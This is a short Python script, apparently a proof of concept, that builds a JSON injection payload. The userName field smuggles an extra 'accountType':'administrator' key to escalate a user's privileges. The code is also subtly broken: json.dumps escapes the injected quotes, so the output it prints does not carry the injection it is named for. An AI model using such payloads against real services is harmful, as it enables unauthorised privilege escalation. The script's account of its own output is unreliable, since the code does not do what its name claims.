# json_injection_payload.py
import json

def generate_json_injection_payload():
    payload = {
        "accountType": "user",
        "userName": 'john", "accountType":"administrator',
        "pass": "password"
    }
    return json.dumps(payload)

print(generate_json_injection_payload())
